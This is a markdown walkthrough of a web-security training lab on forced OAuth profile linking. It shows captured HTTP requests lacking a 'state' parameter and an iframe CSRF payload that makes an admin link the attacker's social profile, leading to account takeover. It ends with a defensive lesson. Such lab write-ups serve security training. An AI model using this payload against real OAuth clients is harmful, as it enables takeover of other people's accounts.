---
tags:
  - oauth
  - api
  - authn
---
# Forced OAuth profile linking

## Instructions

This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts.

To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete `carlos`.

The admin user will open anything you send from the exploit server and they always have an active session on the blog website.

You can log in to your own accounts using the following credentials:

- Blog website account: `wiener:peter`
- Social media profile: `peter.wiener:hotdog`

## Solution

Notice that there is no `state` parameter in the initial request to `/auth`:

```
GET /auth?client_id=hvg0zwcsl0604ghkbuqyc&redirect_uri=https://0ae9007104562dc8808a35de004800e6.web-security-academy.net/oauth-login&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-0a3a003004542d78806e33880223004d.oauth-server.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Referer: https://0ae9007104562dc8808a35de004800e6.web-security-academy.net/
Cookie: _session=3nKmtEllwrLXT8Ht2GSOZ; _session.legacy=3nKmtEllwrLXT8Ht2GSOZ
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
X-PwnFox-Color: magenta
Priority: u=0, i


```

Intercept requests to link a social profile; forward until the `GET` request to `/auth-login`, shown below:

```
GET /oauth-login?code=oYTC4HVSIhTPR2rQdD7ptjHZa0HIfey82qNDQQUdZsZ HTTP/1.1
Host: 0ae9007104562dc8808a35de004800e6.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0ae9007104562dc8808a35de004800e6.web-security-academy.net/
Connection: keep-alive
Cookie: session=VnUAu5M5kEGvyKrft93684XSSsu5YPM6
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
X-PwnFox-Color: magenta
Priority: u=0, i
```

Copy the URL and drop the request. Turn off forwarding and log out of the application. 

Now, in the exploit server, use the following payload to force the victim to link the attacker's social profile to their (the victim's) account:

```
<iframe src="https://0ae9007104562dc8808a35de004800e6.web-security-academy.net/oauth-linking?code=WcKH-G6NUKwlIWqW6X4rCqAllTDn3Yii1wYyWp7LbuN"></iframe>
```

## Lesson learned

Always check for a `state` parameter in OAuth authorization requests. If absent, it may be possible to initiate an auth flow and coerce a victim into completing the flow, potentially leading to account takeover. 